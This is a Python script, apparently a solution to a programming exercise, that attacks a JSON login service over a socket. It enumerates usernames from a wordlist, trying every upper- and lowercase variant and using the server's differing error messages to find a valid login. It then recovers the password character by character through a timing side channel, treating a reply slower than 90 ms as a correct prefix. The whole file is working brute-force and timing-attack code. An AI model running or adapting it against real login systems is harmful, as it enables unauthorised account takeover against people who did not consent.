import sys
import socket
import itertools
import json
from datetime import datetime

i = 1
login_password = {"login": " ", "password": " "}
letters = ' 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# first, have to open file
file_path = f'D:/Hanshin/Python FLAG/logins.txt'
lg_combi = open(file_path, 'r')
# receive from cmd
args = sys.argv
address = (args[1], int(args[2]))
# build socket
with socket.socket() as client_socket:
    client_socket.connect(address)
    # try login loop...
    while i:
        attempt = lg_combi.readline().strip()
        login_generator = itertools.product(*([letter.lower(), letter.upper()] for letter in attempt))
        # send encoded login name
        while True:
            try:
                lg_joined = ''.join(next(login_generator))
            except StopIteration:
                break
            else:
                login_password["login"] = lg_joined
                client_socket.send(json.dumps(login_password, indent=4).encode())
                # check response
                response = client_socket.recv(1024)
                the_response = response.decode()
                the_response = json.loads(the_response)
                if the_response['result'] == "Wrong password!":
                    # when correct login founded
                    i = 0
                    break
                elif the_response['result'] == "Wrong login!":
                    pass
                elif the_response['result'] == "Connection success!":
                    print(json.dumps(login_password, indent=4))
                    lg_combi.close()
                    exit()
    # convert back to dict for element operating
    login_password["password"] = ""
    # try password loop...

    # try in length=1
    for letter in letters:
        login_password['password'] += letter
        client_socket.send(json.dumps(login_password, indent=4).encode())
        start = datetime.now()
        # check response
        response = client_socket.recv(1024)
        end = datetime.now()
        the_response = json.loads(response.decode())
        if the_response['result'] == "Wrong password!":
            if (end - start).microseconds < 90000:  # no exception
                login_password['password'] = ''
                pass
            else:   # exception happens
                break
        elif the_response['result'] == "Connection success!":
            print(json.dumps(login_password, indent=4))
            lg_combi.close()
            exit()
    # found first character
    j = 0
    while True:
        old_password = login_password['password']
        login_password['password'] += letters[j]
        client_socket.send(json.dumps(login_password, indent=4).encode())
        start = datetime.now()
        # check response
        response = client_socket.recv(1024)
        end = datetime.now()
        the_response = json.loads(response.decode())
        if the_response['result'] == "Wrong password!":
            if (end - start).microseconds < 90000:  # no exception
                #  login_password = json.loads(login_password)
                j += 1
                login_password['password'] = old_password
            else:   # exception happens
                j = 0
        elif the_response['result'] == "Connection success!":
            print(json.dumps(login_password, indent=4))
            lg_combi.close()
            exit()
